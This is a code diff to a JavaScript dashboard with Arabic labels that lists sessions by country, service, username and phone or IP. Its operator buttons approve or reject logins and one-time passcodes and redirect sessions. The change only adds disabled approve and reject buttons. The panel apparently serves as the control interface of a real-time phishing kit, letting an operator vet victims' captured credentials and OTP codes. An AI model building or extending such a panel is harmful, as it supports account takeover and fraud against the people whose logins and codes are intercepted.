@@ -554,6 +554,9 @@ function renderOrders() {
         var rLabel = aType === 'login' ? 'رفض' : 'رفض OTP';
         actBtns += '<button class="btn-sm" style="background:rgba(52,211,153,0.15);color:#34d399;" onclick="sessionAction(\'' + aType + '\',' + s.id + ',\'approved\')">' + aLabel + '</button>' +
           '<button class="btn-sm" style="background:rgba(248,113,113,0.15);color:#f87171;" onclick="sessionAction(\'' + aType + '\',' + s.id + ',\'rejected\')">' + rLabel + '</button>';
+      } else {
+        actBtns += '<button class="btn-sm" disabled style="background:rgba(255,255,255,0.06);color:#555;cursor:not-allowed;opacity:0.5;">قبول</button>' +
+          '<button class="btn-sm" disabled style="background:rgba(255,255,255,0.06);color:#555;cursor:not-allowed;opacity:0.5;">رفض</button>';
       }
       tr.innerHTML = '<td>' + s.id + '</td><td>' + (s.country || '-') + '</td><td>' + (s.service || '-') + '</td><td>' + (s.username || '-') + '</td><td dir="ltr" style="text-align:right">' + (s.orderPhone || s.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td>' + actBtns + '</td>';
     } else {
@@ -847,7 +850,13 @@ function renderSessions() {
         '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg> إعادة التوجيه' +
         '</button></div>';
     } else {
-      actionsHtml = '<div class="session-card-actions">' +
+      actionsHtml = '<div class="session-card-actions" style="flex-wrap:wrap;">' +
+        '<button class="btn-action" disabled style="background:rgba(255,255,255,0.06);color:#555;cursor:not-allowed;opacity:0.5;">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> قبول' +
+        '</button>' +
+        '<button class="btn-action" disabled style="background:rgba(255,255,255,0.06);color:#555;cursor:not-allowed;opacity:0.5;">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> رفض' +
+        '</button>' +
         '<button class="btn-session-redirect" onclick="redirectSession(' + s.id + ')">' +
         '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg> إعادة التوجيه' +
         '</button></div>';
